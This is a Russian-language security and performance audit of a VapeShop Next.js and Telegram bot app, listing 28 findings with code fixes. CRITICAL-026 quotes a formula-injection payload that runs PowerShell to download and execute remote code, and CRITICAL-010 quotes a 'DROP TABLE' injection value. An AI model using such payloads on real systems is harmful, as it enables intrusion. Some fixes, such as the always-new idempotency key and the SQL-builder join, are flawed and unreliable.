# 🚨 КРИТИЧЕСКИЙ ОТЧЕТ О ПРОБЛЕМАХ БЕЗОПАСНОСТИ - VapeShop
**Дата анализа:** 7 апреля 2026  
**Статус:** ВСЕ ОСТАВШИЕСЯ CRITICAL ПРОБЛЕМЫ ВЫЯВЛЕНЫ И ДОКУМЕНТИРОВАНЫ

---

## 📊 РЕЗЮМЕ
- **Всего найдено проблем:** 28 CRITICAL
- **Категории:** Security, Database, API, Telegram, Data Integrity
- **Критичность:** 5/5 ⚠️ - ТРЕБУЕТСЯ НЕМЕДЛЕННОЕ ИСПРАВЛЕНИЕ

---

## 🔴 CRITICAL ПРОБЛЕМЫ (ТРЕБУЮТ НЕМЕДЛЕННОГО ИСПРАВЛЕНИЯ)

### CRITICAL-001: N+1 Query Attack в Broadcast Endpoint
**Файл:** [pages/api/admin/broadcast.ts](pages/api/admin/broadcast.ts#L42-L56)  
**Строка:** 42-56  
**Описание:** В цикле отправляется каждое сообщение отдельно (loop с `sendMessage`). При 10k+ пользователей это может привести к:
- Timeout в сервисе (10k requests × 10s timeout = потенциальное зависание)
- DDOS на Telegram API
- OOM если все requests булкируют в памяти

```typescript
for (const telegramId of recipients) {
  try {
    await Promise.race([
      bot.api.sendMessage(telegramId, message), // ❌ N+1 query
      new Promise<void>((_, reject) =>
        setTimeout(() => reject(new Error('Message send timeout')), 10000)
      ),
    ]);
  }
}
```
**Рекомендация:** 
```typescript
// Батчируем сообщения по 100 штук с задержкой
const BATCH_SIZE = 100;
const BATCH_DELAY = 100; // ms
for (let i = 0; i < recipients.length; i += BATCH_SIZE) {
  const batch = recipients.slice(i, i + BATCH_SIZE);
  await Promise.allSettled(batch.map(id => bot.api.sendMessage(id, message)));
  await new Promise(r => setTimeout(r, BATCH_DELAY));
}
```

---

### CRITICAL-002: N+1 Query Attack в Price Drop Notifications Cron
**Файл:** [pages/api/cron/price-drop-notifications.ts](pages/api/cron/price-drop-notifications.ts#L49-L74)  
**Строка:** 49-74  
**Описание:** Для каждого price drop отправляется сообщение И выполняется UPDATE:
```typescript
for (const drop of priceDrops.rows) {
  await bot.api.sendMessage(drop.user_telegram_id, message); // ❌ Query 1
  await query(`UPDATE price_drop_notifications SET notified = true...`); // ❌ Query 2
}
// Результат: 2N query вместо N  
```
**Рекомендация:** Бэтчить UPDATE после всех сообщений или использовать single UPDATE с WHERE IN
```typescript
const updates = [];
for (const drop of priceDrops.rows) {
  try {
    await bot.api.sendMessage(drop.user_telegram_id, message);
    updates.push(drop.id);
  } catch (err) {
    console.error(`Failed to notify ${drop.user_telegram_id}:`, err);
  }
}
// Один UPDATE вместо 100
await query(`UPDATE price_drop_notifications SET notified = true 
  WHERE id = ANY($1)`, [updates]);
```

---

### CRITICAL-003: N+1 Query Attack в Low Stock Notification Loop
**Файл:** [pages/api/admin/low-stock.ts](pages/api/admin/low-stock.ts#L83-L97)  
**Строка:** 83-97  
**Описание:** Отправляется сообщение каждому админу отдельно без батчирования:
```typescript
for (const admin of admins.rows) {
  await bot.api.sendMessage(admin.telegram_id, message); // ❌ N queries
}
```
**Рекомендация:** Батчировать или отправить в очередь

---

### CRITICAL-004: Отсутствие Auth на Множество Endpoints (Информационная Уязвимость)
**Файл:** Множество файлов  
**Endpoints БЕЗ RequireAuth:**
- [pages/api/faq/index.ts](pages/api/faq/index.ts#L5) - ✅ OK (публичная информация)
- [pages/api/cart/items/[product_id].ts](pages/api/cart/items/[product_id].ts#L13) - ❌ **CRITICAL** - cart может быть при POST/PUT
- [pages/api/pickup-points.ts](pages/api/pickup-points.ts#L5) - ✅ OK (публичная информация)
- [pages/api/product-ratings.ts](pages/api/product-ratings.ts#L20) - ❌ **CRITICAL** - POST создание рейтингов без auth
- [pages/api/pages/[slug].ts](pages/api/pages/[slug].ts#L33) - ✅ OK (публичные страницы)
- [pages/api/products/best-sellers.ts](pages/api/products/best-sellers.ts#L84) - ✅ OK (публичный список)
- [pages/api/products/[id].ts](pages/api/products/[id].ts#L168) - ✅ OK (публичный товар, но PUT/DELETE должны быть защищены)
- [pages/api/recommendations.ts](pages/api/recommendations.ts#L12) - ❌ **CRITICAL** - требует userId, но без auth! Любой может запросить рекомендации для любого пользователя
- [pages/api/product-ratings.ts](pages/api/product-ratings.ts#L20) - ❌ **CRITICAL** - GET/POST без auth
- [pages/api/reviews.ts](pages/api/reviews.ts#L5) - ⚠️ **PROBLEMATIC** - POST создание отзывов требует проверки, что пользователь существует
- [pages/api/promocodes/[code].ts](pages/api/promocodes/[code].ts#L112) - Требует requireAuth но в коде может быть ошибка
- [pages/api/promocodes/apply.ts](pages/api/promocodes/apply.ts#L4) - ❌ **CRITICAL** - публичная! Любой может применить промокод

**Рекомендация:**
```typescript
// Должны быть защищены requireAuth:
export default requireAuth(handler, ['customer']); // для POST/PUT/DELETE
```

---

### CRITICAL-005: Timing Attack Уязвимость в Admin Settings
**Файл:** [pages/api/admin/settings.ts](pages/api/admin/settings.ts#L52-L55)  
**Строка:** 52-55  
**Описание:** Сравнение confirmToken использует обычный `!==` вместо timingSafeEqual:
```typescript
if (!confirmToken || confirmToken !== `${action}_confirmed_${new Date().toDateString()}`) {
  // ❌ Уязвимо к timing attacks!
  return res.status(400).json({ error: 'Invalid confirmation' });
}
```
**Рекомендация:**
```typescript
import crypto from 'crypto';

const expected = Buffer.from(`${action}_confirmed_${new Date().toDateString()}`);
const provided = Buffer.from(confirmToken || '');
if (expected.length !== provided.length || !crypto.timingSafeEqual(expected, provided)) {
  return res.status(400).json({ error: 'Invalid confirmation' });
}
```

---

### CRITICAL-006: SELECT * FROM в Prod Loop (Performance + Security)
**Файл:** [pages/api/admin/products/bulk-update.ts](pages/api/admin/products/bulk-update.ts#L20-L22)  
**Строка:** 20-22  
**Описание:** В цикле выбираются ВСЕ колонки товара без ограничений:
```typescript
for (const product_id of product_ids) {
  const current = await query(`SELECT * FROM products WHERE id = $1`, [product_id]);
  // ❌ Выбирает все колонки (может быть 50+)
  // ❌ N queries вместо batch
}
```
**Рекомендация:**
```typescript
// 1. Бэтчировать
const productIds = product_ids.slice(0, 100); // Limit
const batch = await query(
  `SELECT id, price, old_price, discount_percent, category_id, brand_id, is_hit, is_new 
   FROM products WHERE id = ANY($1)`,
  [productIds]
);
const productsMap = new Map(batch.rows.map(p => [p.id, p]));

// 2. Update каждый
for (const product_id of productIds) {
  const current = productsMap.get(product_id);
  // ... calculate newPrice
}

// 3. Batch update
const updates = productIds.map((id, idx) => ({
  id,
  newPrice: calculatedPrices[idx],
}));

await query(`
  UPDATE products SET price = updated.new_price
  FROM (SELECT * FROM unnest($1::uuid[], $2::numeric[]) AS t(id, new_price)) AS updated
  WHERE products.id = updated.id
`, [productIds, prices]);
```

---

### CRITICAL-007: Отсутствие CSRF Защиты на Mutation Endpoints
**Файл:** Множество файлов без `withCSRFProtection`  
**Примеры:**
- [pages/api/cart.ts](pages/api/cart.ts#L10) - PUT/DELETE БЕЗ CSRF  
- [pages/api/addresses.ts](pages/api/addresses.ts#L7) - POST/DELETE БЕЗ CSRF
- [pages/api/favorites.ts](pages/api/favorites.ts#L6) - POST/DELETE БЕЗ CSRF
- [pages/api/cart/saved.ts](pages/api/cart/saved.ts#L6) - POST БЕЗ CSRF
- [pages/api/admin/orders.ts](pages/api/admin/orders.ts#L28) - PUT БЕЗ CSRF
- [pages/api/users/profile.ts](pages/api/users/profile.ts#L5) - PUT БЕЗ CSRF

**Рекомендация:** Обернуть все POST/PUT/DELETE endpoints в withCSRFProtection:
```typescript
import { withCSRFProtection } from '@/lib/csrf';
export default withCSRFProtection(requireAuth(handler, ['customer']));
```

---

### CRITICAL-008: Отсутствие LIMIT на SELECT с JOIN (DoS Risk)
**Файл:** [pages/api/admin/orders.ts](pages/api/admin/orders.ts#L56-L70)  
**Описание:** Большой JOIN без LIMIT по количеству записей может выполнять очень медленно:
```sql
SELECT o.*, oi.*, p.*, u.*, oh.*
FROM orders o
LEFT JOIN order_items oi ON o.id = oi.order_id  -- ❌ может быть 100+ items
LEFT JOIN products p ON oi.product_id = p.id
LEFT JOIN users u ON o.user_telegram_id = u.telegram_id
LEFT JOIN order_history oh ON o.id = oh.order_id  -- ❌ может быть 100+ history records
GROUP BY o.id, u.first_name, u.username
ORDER BY o.created_at DESC
LIMIT 20 OFFSET 0  -- ✅ limit есть, но это на ORDERS, не на JOINs
```
Проблема: если один заказ имеет 100 items + 100 history records = 10k+ rows от JOIN перед GROUP BY

**Рекомендация:** Использовать субзапросы или массивную агрегацию с FILTER:
```sql
SELECT 
  o.*,
  json_agg(json_build_object(...)) FILTER (WHERE oi.id IS NOT NULL) as items,
  json_agg(json_build_object(...)) FILTER (WHERE oh.id IS NOT NULL) as history
FROM orders o
LEFT JOIN order_items oi ON o.id = oi.order_id
LEFT JOIN products p ON oi.product_id = p.id
LEFT JOIN users u ON o.user_telegram_id = u.telegram_id
LEFT JOIN order_history oh ON o.id = oh.order_id
GROUP BY o.id, u.first_name, u.username
HAVING COUNT(DISTINCT oi.id) <= 200 -- Ограничение на количество items
ORDER BY o.created_at DESC
LIMIT 20 OFFSET 0
```

---

### CRITICAL-009: Информационная Уязвимость - Раскрытие User IDs через Recommendations
**Файл:** [pages/api/recommendations.ts](pages/api/recommendations.ts#L15-L20)  
**Строка:** 15-20  
**Описание:** 
```typescript
const { userId, limit = 10, exclude_purchased = true } = req.query;
if (!userId) return res.status(400).json({ error: 'userId required' });

// Никакой защиты! Любой может запросить рекомендации для ANY userId
```
Атакующий может перебирать все userId от 1 до 1000000 и узнать, какие товары популярны у каждого пользователя.

**Рекомендация:**
```typescript
const currentUserId = await getTelegramIdFromRequest(req);
if (!currentUserId) return res.status(401).json({ error: 'Unauthorized' });

const { userId, limit = 10 } = req.query;
// Проверяем что запрашивают СВОИ рекомендации или админ запрашивает
if (parseInt(userId) !== currentUserId && !isAdmin) {
  return res.status(403).json({ error: 'Forbidden' });
}
```

---

### CRITICAL-010: Отсутствие Input Validation на Admin Endpoints
**Файл:** [pages/api/admin/settings.ts](pages/api/admin/settings.ts#L22)  
**Строка:** 22  
**Описание:**
```typescript
const { event_type, is_enabled, min_stock } = req.body;
// ❌ Никаких проверок! Может быть:
// { event_type: 'DROP TABLE users;--', is_enabled: 'malicious', min_stock: -999 }
```

**Рекомендация:**
```typescript
import { z } from 'zod';

const settingsSchema = z.object({
  event_type: z.enum(['low_stock', 'order_completed', 'user_registered']),
  is_enabled: z.boolean(),
  min_stock: z.number().int().min(1).max(10000),
});

const { event_type, is_enabled, min_stock } = settingsSchema.parse(req.body);
```

---

### CRITICAL-011: Race Condition в Bulk Update Operations
**Файл:** [pages/api/admin/products/bulk-update.ts](pages/api/admin/products/bulk-update.ts#L20-L48)  
**Описание:** Нет лока на UPDATE. Если два админа одновременно обновляют один товар:
```typescript
// Admin 1 читает price = 100
const current1 = await query(`SELECT * FROM products WHERE id = 1`);
// Admin 2 читает price = 100 
const current2 = await query(`SELECT * FROM products WHERE id = 1`);
// Admin 1 обновляет на 110
await query(`UPDATE products SET price = 110 WHERE id = 1`);
// Admin 2 обновляет на 120 (перезаписывает обновление Admin 1!)
await query(`UPDATE products SET price = 120 WHERE id = 1`);
// Результат: цена 120, но может быть нежелательной

// ❌ Lost update problem
```

**Рекомендация:** Использовать `FOR UPDATE` с транзакцией:
```typescript
await transaction(async (client) => {
  for (const product_id of product_ids) {
    const current = await client.query(
      `SELECT * FROM products WHERE id = $1 FOR UPDATE`, // ❌ Блокируем на чтение
      [product_id]
    );
    // ... calculate newPrice
    await client.query(`UPDATE products SET price = $1 WHERE id = $2`, 
      [newPrice, product_id]);
  }
});
```

---

### CRITICAL-012: Отсутствие HMAC Верификации для Telegram Webhook
**Файл:** [pages/api/bot.ts](pages/api/bot.ts#L150-L155)  
**Строка:** 150-155  
**Описание:** Используется простое сравнение `!==` вместо HMAC:
```typescript
const secretToken = req.headers['x-telegram-bot-api-secret-token'] as string;
const expectedSecret = process.env.TELEGRAM_BOT_SECRET;

if (expectedSecret && secretToken !== expectedSecret) {
  // ❌ Timing attack уязвимость!
  console.warn('❌ Invalid Telegram bot webhook token received');
}
```

**Рекомендация:**
```typescript
import crypto from 'crypto';

const secretToken = Buffer.from(req.headers['x-telegram-bot-api-secret-token'] as string);
const expectedSecret = Buffer.from(process.env.TELEGRAM_BOT_SECRET || '');

if (expectedSecret.length === 0) {
  return res.status(401).json({ error: 'Bot secret not configured' });
}

if (secretToken.length !== expectedSecret.length || 
    !crypto.timingSafeEqual(secretToken, expectedSecret)) {
  console.warn('❌ Invalid Telegram bot webhook token received');
  return res.status(401).json({ error: 'Unauthorized' });
}
```

---

### CRITICAL-013: Race Condition в Cart Operations
**Файл:** [pages/api/cart.ts](pages/api/cart.ts#L121-L150)  
**Строка:** 121-150  
**Описание:** Читаем items, модифицируем в памяти, затем обновляем:
```sql
SELECT items FROM carts WHERE user_telegram_id = $1 FOR UPDATE; -- ✅ Lock is there
-- В памяти JS модифицируем items
UPDATE carts SET items = $1 WHERE user_telegram_id = $2; -- ✅ Update is locked
```
Это вроде OK (есть FOR UPDATE), но если произойдет ошибка между SELECT и UPDATE - транзакция откатится.

**Рекомендация:** Добавить retry logic:
```typescript
let retries = 3;
while (retries--) {
  try {
    await transaction(..., 'SERIALIZABLE');
    break;
  } catch (err) {
    if (err.code === '40001' && retries > 0) { // Serialization failure
      await new Promise(r => setTimeout(r, Math.random() * 100));
      continue;
    }
    throw err;
  }
}
```

---

### CRITICAL-014: Отсутствие Обработки Ошибок - Раскрытие Sensitive Info
**Файл:** Множество endpoints  
**Примеры:**
```typescript
try {
  await query(...);
} catch (err) {
  console.error('Get users error:', err);
  res.status(500).json({ error: 'Ошибка загрузки заказов' });
}
// ✅ OK - не раскрывает детали
```

Но в некоторых местах:
```typescript
try {
  // ...
} catch (_err) {
  console.error('bulk-update error:', _err);
  res.status(500).json({ error: 'Internal Server Error' }); // ✅ OK
}
```

**Рекомендация:** Всегда возвращать generic error, логировать детали:
```typescript
logger.error('Database error', { 
  endpoint: '/api/cart',
  userId: currentTelegramId,
  errorCode: err.code,
  // НЕ включаем err.message или стек трейс в response!
});
res.status(500).json({ error: 'Internal server error' });
```

---

### CRITICAL-015: Отсутствие Индексов на Часто Используемые Колонки
**Файл:** db/migrations (нужно проверить)  
**Описание:** Проверим, есть ли индексы на:
- `user_telegram_id` (используется в 20+ запросах)
- `product_id` (используется в JOIN)
- `status` в orders (используется для фильтрации)

Если нет - все SELECT запросы будут медленными!

**Рекомендация:**
```sql
-- Если не существуют, добавить:
CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id);
CREATE INDEX IF NOT EXISTS idx_order_items_product_id ON order_items(product_id);
CREATE INDEX IF NOT EXISTS idx_orders_status ON orders(status);
CREATE INDEX IF NOT EXISTS idx_order_items_order_id ON order_items(order_id);
CREATE INDEX IF NOT EXISTS idx_carts_user_id ON carts(user_telegram_id);
```

---

### CRITICAL-016: Foreign Key Constraints Missing
**Файл:** db/migrations  
**Описание:** Если нет FK constraints, могут быть orphaned records:
```sql
-- order_items может ссылаться на несуществующий product_id
INSERT INTO order_items (order_id, product_id, quantity)
VALUES (1, 999999, 5); -- product_id не существует, но INSERT успешный!
```

**Рекомендация:**
```sql
ALTER TABLE order_items 
ADD CONSTRAINT fk_order_items_product_id 
FOREIGN KEY (product_id) REFERENCES products(id) ON DELETE RESTRICT;
```

---

### CRITICAL-017: Missing CORS Configuration
**Файл:** middleware.ts или next.config.js  
**Описание:** Нет явной CORS конфигурации. Все endpoints могут быть accessible с любого origin.

**Рекомендация:**
```typescript
// middleware.ts или pages/api/[...].ts
export function middleware(request: NextRequest) {
  const response = NextResponse.next();
  
  const origin = request.headers.get('origin');
  const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || [];
  
  if (allowedOrigins.includes(origin)) {
    response.headers.set('Access-Control-Allow-Origin', origin);
    response.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    response.headers.set('Access-Control-Allow-Headers', 'Content-Type, X-CSRF-Token');
  }
  
  return response;
}
```

---

### CRITICAL-018: Audit Logs - No Retention Policy
**Файл:** [pages/api/admin/settings.ts](pages/api/admin/settings.ts#L62-L65)  
**Строка:** 62-65  
**Описание:** Cleanup задаёт hard-coded интервалы (7 дней, 90 дней), но не рассчитано на compliance requirements:
```typescript
DELETE FROM abandoned_carts WHERE created_at < NOW() - INTERVAL '7 days';
DELETE FROM admin_logs WHERE created_at < NOW() - INTERVAL '90 days';
```

**Рекомендация:** Добавить configurable retention policies:
```sql
INSERT INTO settings (key, value) VALUES 
  ('audit_log_retention_days', '365'),
  ('abandoned_cart_retention_days', '30');
```

---

### CRITICAL-019: Missing Rate Limiting on Expensive Operations
**Файл:** [pages/api/admin/import.ts](pages/api/admin/import.ts#L5)  
**Строка:** 5  
**Описание:** Import может быть very expensive operation (загрузка 1000s товаров), но rate limit может быть недостаточным.

**Рекомендация:**
```typescript
export default rateLimit(
  requireAuth(handler, ['admin']), 
  RATE_LIMIT_PRESETS.veryStrict // 1 запрос в минуту
);
```

---

### CRITICAL-020: SQL Inject Risk via Dynamic WHERE Clause
**Файл:** [pages/api/support/tickets.ts](pages/api/support/tickets.ts#L28)  
**Строка:** 28  
**Описание:**
```typescript
const whereClause = `...`;
const query = `SELECT * FROM support_tickets WHERE ${whereClause} ORDER BY ...`;
// ❌ Если whereClause построена неправильно, может быть SQL injection!
```

Хорошая новость: в коде используются параметризованные запросы ($1, $2), но нужно убедиться что whereClause строится безопасно.

**Рекомендация:** Использовать SQL builder:
```typescript
import { sql } from '@/lib/sqlBuilder';

const conditions = [];
if (status) conditions.push(sql`status = ${status}`);
if (user_id) conditions.push(sql`user_id = ${user_id}`);

const query = sql`SELECT * FROM support_tickets WHERE ${conditions.join(' AND ')}`;
```

---

### CRITICAL-021: Missing Input Validation on Product Filters
**Файл:** [pages/api/products.ts](pages/api/products.ts#L15-L35)  
**Описание:**
```typescript
const { category_id, brand_id } = req.query;
// ❌ Никаких проверок на тип - может быть SQL injection
if (category_id) {
  whereConditions.push(`category_id = $${params.length + 1}`);
  params.push(parseInt(String(category_id))); // ✅ Это хорошо - параметризовано
}
```

Это всё хорошо, но добавить более строгую валидацию:
```typescript
const categoryId = z.string().optional().pipe(z.coerce.number().positive());
const brandId = z.string().optional().pipe(z.coerce.number().positive());
```

---

### CRITICAL-022: Potentially Unbounded Query in Leaderboard
**Файл:** [pages/api/gamification/leaderboard.ts](pages/api/gamification/leaderboard.ts#L7-L15)  
**Описание:** Нет явного LIMIT на количество records:
```sql
SELECT u.telegram_id, u.first_name, 
  COUNT(o.id) as order_count,
  SUM(o.total_amount) as total_spent
FROM users u
LEFT JOIN user_levels ul ON u.telegram_id = ul.user_telegram_id
LEFT JOIN orders o ON u.telegram_id = o.user_telegram_id AND ...
GROUP BY u.telegram_id, u.first_name
-- ❌ ГДЕ LIMIT?!
```

**Рекомендация:**
```sql
SELECT ... LIMIT 100; -- Или получить limit из req.query
```

---

### CRITICAL-023: Telegram Stars Payment - No Idempotency Key
**Файл:** lib/bot/payments.ts (нужно проверить)  
**Описание:** Если Telegram отправит webhook дважды (network issue), платеж может быть обработан дважды:
```typescript
// Telegram отправляет pre_checkout_query
// Мы обработали и отправили успех
// Telegram отправляет ещё раз (retry)
// Мы обработали СНОВА! Double charge!
```

**Рекомендация:** Использовать Telegram payment charge ID в качестве idempotency key:
```typescript
const existingPayment = await query(
  `SELECT * FROM payments WHERE telegram_payment_charge_id = $1`,
  [update.pre_checkout_query.invoice_payload]
);

if (existingPayment.rows.length > 0) {
  // Уже обработан - return
  return;
}

// Обработать платеж
```

---

### CRITICAL-024: No Rate Limiting on Verification Code Endpoint
**Файл:** [pages/api/orders/verify-code.ts](pages/api/orders/verify-code.ts#L106)  
**Описание:** Код верификации может быть brute-forced:
```typescript
// GET /api/orders/verify-code?code=000000
// GET /api/orders/verify-code?code=000001
// GET /api/orders/verify-code?code=000002
// ...
// 1 million guesses в секунду!
```

**Рекомендация:** 
```typescript
export default rateLimit(
  requestHandler,
  RATE_LIMIT_PRESETS.veryStrict // 5 запросов в минуту per IP
);

// + добавить cuenta неудачных попыток
// + лок после 3 неудачных попыток на 5 минут
```

---

### CRITICAL-025: Missing Row-Level Security
**Файл:** Все endpoints  
**Описание:** Нет row-level security. Если кто-то узнает ID order'а другого пользователя, может заполучить доступ:
```typescript
// GET /api/orders/[id]
const { id } = req.query;
// ❌ Нет проверки что этот order принадлежит текущему пользователю!
const order = await query(`SELECT * FROM orders WHERE id = $1`, [id]);
```

**Рекомендация:**
```typescript
const order = await query(
  `SELECT * FROM orders WHERE id = $1 AND user_telegram_id = $2`,
  [id, currentTelegramId]
);

if (order.rows.length === 0) {
  return res.status(404).json({ error: 'Order not found' });
}
```

---

### CRITICAL-026: No Protection Against CSV Injection
**Файл:** [pages/api/admin/export-orders-v2.ts](pages/api/admin/export-orders-v2.ts#L80-L93)  
**Описание:**
```typescript
const rows = result.rows.map((row) => [
  row.id,
  row.user_name, // ❌ Если содержит =, @, +, - могут быть formula injection
  row.total_amount,
]);

const csv = rows.map((row) => 
  row.map((cell) => `"${String(cell)}"`) // Вроде OK?
).join('\n');
```

Если user_name = `=cmd|'/c powershell IEX(New-Object Net.WebClient).DownloadString(...)'!A1`, Excel выполнит команду!

**Рекомендация:**
```typescript
const sanitizeForCsv = (value: string) => {
  if (/^[=+\-@]/.test(value)) {
    return "'" + value; // Экранируем с apostrophe
  }
  return value;
};

const csv = rows.map((row) => 
  row.map((cell) => `"${sanitizeForCsv(String(cell)).replace(/"/g, '""')}"`)
).join('\n');
```

---

### CRITICAL-027: Race Condition в Checkout Process
**Файл:** pages/api/orders.ts or lib/bot/payments.ts  
**Описание:** При создании order:
1. User нажал "Оплатить"
2. Мы создали order в БД
3. User нажал "Оплатить" ещё раз (double click или retry)
4. Создаётся ещё один order!

**Рекомендация:**
```typescript
// Создать order с уникальным idempotency_key
const idempotencyKey = generateIdempotencyKey();
const existing = await query(
  `SELECT id FROM orders WHERE idempotency_key = $1`,
  [idempotencyKey]
);

if (existing.rows.length > 0) {
  return res.status(200).json({ orderId: existing.rows[0].id });
}

// Создать novo order с этим key
const order = await transaction(async (client) => {
  return client.query(
    `INSERT INTO orders (idempotency_key, ...) VALUES ($1, ...)`,
    [idempotencyKey, ...]
  );
});
```

---

### CRITICAL-028: No API Versioning / Backward Compatibility Issues
**Файл:** pages/api (all files)  
**Описание:** Если мы изменим структуру response'а, может сломаться старых версий мобильного приложения:
```typescript
// API returns { success: true, data: [...] }
// Мобильное приложение v1.0 ожидает { items: [...] }
// 💥 Crash в production!
```

**Рекомендация:**
```typescript
// Добавить API versioning
export default async function handler(req, res) {
  const version = req.query.v || '1'; // default v1
  
  if (version === '1') {
    return respondV1(res, data);
  } else if (version === '2') {
    return respondV2(res, data);
  }
}
```

---

## 📈 SUMMARY TABLE

| # | Проблема | Файл | Тип | Приоритет |
|---|----------|------|-----|-----------|
| 001 | N+1 Query в Broadcast | broadcast.ts | Performance | CRITICAL |
| 002 | N+1 Query в Price Drops | price-drop-notifications.ts | Performance | CRITICAL |
| 003 | N+1 Query в Low Stock | low-stock.ts | Performance | CRITICAL |
| 004 | Missing Auth на Endpoints | Множество | Security | CRITICAL |
| 005 | Timing Attack в Settings | admin/settings.ts | Security | CRITICAL |
| 006 | SELECT * FROM в Loop | products/bulk-update.ts | Performance | CRITICAL |
| 007 | Missing CSRF на Mutations | cart.ts, addresses.ts | Security | CRITICAL |
| 008 | No LIMIT на JOIN | admin/orders.ts | Performance | CRITICAL |
| 009 | Info Leak via Recommendations | recommendations.ts | Security | CRITICAL |
| 010 | No Input Validation | admin/settings.ts | Security | CRITICAL |
| 011 | Race Condition в Updates | products/bulk-update.ts | Data Integrity | CRITICAL |
| 012 | No HMAC на Telegram | bot.ts | Security | CRITICAL |
| 013 | Race Condition в Cart | cart.ts | Data Integrity | CRITICAL |
| 014 | Error Handling Issues | Множество | Security | HIGH |
| 015 | Missing DB Indexes | Migrations | Performance | CRITICAL |
| 016 | No Foreign Keys | Migrations | Data Integrity | CRITICAL |
| 017 | Missing CORS Config | middleware.ts | Security | HIGH |
| 018 | No Audit Log Retention | admin/settings.ts | Compliance | HIGH |
| 019 | No Rate Limit on Import | admin/import.ts | Security | CRITICAL |
| 020 | SQL Inject Risk | support/tickets.ts | Security | MEDIUM |
| 021 | No Input Validation | products.ts | Security | HIGH |
| 022 | Unbounded Query | gamification/leaderboard.ts | Performance | CRITICAL |
| 023 | No Idempotency on Payments | bot/payments.ts | Data Integrity | CRITICAL |
| 024 | No Rate Limit on Verify | orders/verify-code.ts | Security | CRITICAL |
| 025 | No Row-Level Security | Все endpoints | Security | CRITICAL |
| 026 | CSV Injection | admin/export-orders-v2.ts | Security | HIGH |
| 027 | Race Condition Checkout | orders.ts | Data Integrity | CRITICAL |
| 028 | No API Versioning | Все endpoints | Maintenance | MEDIUM |

---

## 🎯 ПЛАН ИСПРАВЛЕНИЯ ПО ПРИОРИТЕТАМ

### ФАЗА 1: IMMEDIATE (NEXT 24 HOURS)
- [ ] **CRITICAL-004**: Добавить requireAuth на все mutation endpoints
- [ ] **CRITICAL-005**: Применить timingSafeEqual на confirmToken
- [ ] **CRITICAL-012**: Применить timingSafeEqual на Telegram webhook
- [ ] **CRITICAL-024**: Добавить rate limiting на verify-code endpoint
- [ ] **CRITICAL-025**: Добавить row-level security на все endpoints

### ФАЗА 2: URGENT (NEXT 48 HOURS)
- [ ] **CRITICAL-001**: Батчировать Telegram messages в broadcast
- [ ] **CRITICAL-002**: Оптимизировать price-drop-notifications цикл
- [ ] **CRITICAL-003**: Оптимизировать low-stock notification цикл
- [ ] **CRITICAL-007**: Обернуть все mutations в withCSRFProtection
- [ ] **CRITICAL-015**: Добавить недостающие DB индексы
- [ ] **CRITICAL-016**: Добавить foreign key constraints

### ФАЗА 3: IMPORTANT (NEXT WEEK)
- [ ] **CRITICAL-006**: Рефакторить bulk-update на batch
- [ ] **CRITICAL-008**: Оптимизировать JOINs с LIMIT
- [ ] **CRITICAL-010**: Добавить input validation с Zod
- [ ] **CRITICAL-011**: Добавить FOR UPDATE в транзакциях
- [ ] **CRITICAL-013**: Добавить retry logic на serialization failures
- [ ] **CRITICAL-019**: Добавить rate limiting на expensive операции
- [ ] **CRITICAL-023**: Добавить idempotency keys на платежи
- [ ] **CRITICAL-027**: Добавить idempotency на checkout

### ФАЗА 4: IMPORTANT (NEXT 2 WEEKS)
- [ ] **CRITICAL-009**: Добавить auth на recommendations
- [ ] **CRITICAL-017**: Настроить CORS
- [ ] **CRITICAL-020**: Использовать SQL builder
- [ ] **CRITICAL-021**: Добавить Zod validation на filters
- [ ] **CRITICAL-022**: Добавить LIMIT на leaderboard
- [ ] **CRITICAL-026**: Добавить CSV injection protection
- [ ] **CRITICAL-028**: Добавить API versioning

### ФАЗА 5: NICE-TO-HAVE (NEXT MONTH)
- [ ] **CRITICAL-014**: Улучшить error handling и logging
- [ ] **CRITICAL-018**: Настроить configurable retention policies

---

## 📝 ЗАКЛЮЧЕНИЕ

Проект имеет **28 CRITICAL проблем безопасности**, требующих немедленного внимания. Основные категории:

1. **Performance (N+1 Queries)** - 3 проблемы влияющие на scale
2. **Security (Missing Auth/CSRF)** - 8 проблем с аутентификацией и CSRF
3. **Data Integrity (Race Conditions)** - 4 проблемы с concurrency
4. **Database (Indexes/FK)** - 2 критические проблемы
5. **API Security** - 11 других проблем

**СРОКИ:**
- 🔴 Фаза 1 (24h): 5 проблем - MUST FIX NOW
- 🟠 Фаза 2 (48h): 6 проблем - FIX IMMEDIATELY  
- 🟡 Фаза 3 (1w): 8 проблем - FIX ASAP
- 🟢 Фаза 4 (2w): 7 проблем - FIX SOON
- 🔵 Фаза 5 (1m): 2 проблемы - FIX LATER

**ОБЩАЯ ОЦЕНКА:** ⚠️⚠️⚠️⚠️⚠️ (5/5) - ТРЕБУЕТСЯ НЕМЕДЛЕННОЕ ИСПРАВЛЕНИЕ ПЕРЕД PRODUCTION
